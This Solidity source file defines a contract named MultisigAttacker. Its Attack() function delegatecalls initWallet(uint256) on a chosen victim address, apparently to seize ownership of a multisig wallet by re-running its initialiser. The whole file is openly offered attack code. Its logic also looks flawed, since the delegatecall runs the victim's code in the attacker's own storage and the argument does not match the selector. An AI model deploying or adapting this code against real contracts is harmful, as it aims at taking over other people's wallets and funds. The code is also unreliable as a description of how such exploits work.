pragma solidity ^0.8.0;

contract MultisigAttacker{
    
    // address owner;
    address victim;
    
    function setVictim(address target) public{ 
        victim = target; 
        
    }
   
    
    function Attack() public returns (bool status, bytes memory data){ 
        (status, data) = victim.delegatecall(abi.encodePacked(bytes4(keccak256("initWallet(uint256)")), msg.sender)); 
        return (status, data);
        
    }
   
}